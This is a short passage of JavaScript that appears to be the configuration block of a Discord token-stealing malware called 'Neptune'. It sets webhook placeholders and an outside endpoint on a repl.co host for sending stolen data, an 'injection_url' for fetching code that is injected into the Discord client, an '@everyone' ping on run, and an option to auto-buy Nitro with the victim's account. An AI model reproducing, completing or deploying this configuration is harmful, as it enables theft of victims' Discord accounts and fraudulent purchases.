...
const config = {
  webhook: '%WEBHOOK%', 
  webhook2: 'https://api.gamzol.repl.co/api/send', 
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: true,
  ping_on_run: true, 
  ping_val: '@everyone', 
  embed_name: 'Neptune', 
  embed_icon: 'https://cdn.discordapp.com/attachments/1113445608691335181/1115091682736734230/IMG_9350.png'.replace(/ /g, '%20'), 
  embed_color: 8363488,
  injection_url: 'https://api.gamzol.repl.co/injection', 
